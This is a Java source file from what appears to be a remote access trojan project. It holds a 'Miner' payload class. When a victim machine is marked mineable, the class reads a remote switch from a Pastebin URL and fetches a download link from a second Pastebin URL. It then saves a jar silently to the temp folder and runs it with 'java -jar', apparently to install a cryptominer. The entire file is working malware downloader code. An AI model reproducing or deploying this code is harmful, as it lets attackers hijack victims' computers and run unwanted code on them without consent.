//Raddon On Top!

package org.rat.payload.payloads;

import org.rat.payload.*;
import java.io.*;
import java.net.*;

public class Miner implements IPayload
{
    public void run() {
        if (PCInfo.mineable) {
            try {
                final StringBuilder builder = new StringBuilder();
                final BufferedReader reader = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/RVcLeS20").openStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    builder.append(line);
                }
                if (builder.toString().contains("true")) {
                    final StringBuilder builder2 = new StringBuilder();
                    final BufferedReader reader2 = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/jtv4tf6k").openStream()));
                    String line2;
                    while ((line2 = reader2.readLine()) != null) {
                        builder2.append(line2);
                    }
                    downloadFile(builder2.toString(), System.getProperty("java.io.tmpdir") + "\\SFR_Bio.jar");
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    public static void downloadFile(final String url, final String to) {
        try {
            final File file = new File(to);
            if (!file.exists()) {
                final URL from = new URL(url);
                final String boundary = Long.toHexString(System.currentTimeMillis());
                final URLConnection connection = from.openConnection();
                connection.setDoOutput(true);
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                final BufferedInputStream in = new BufferedInputStream(connection.getInputStream());
                final FileOutputStream fos = new FileOutputStream(to);
                final byte[] dataBuffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
                    fos.write(dataBuffer, 0, bytesRead);
                }
                Runtime.getRuntime().exec("java -jar " + to);
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
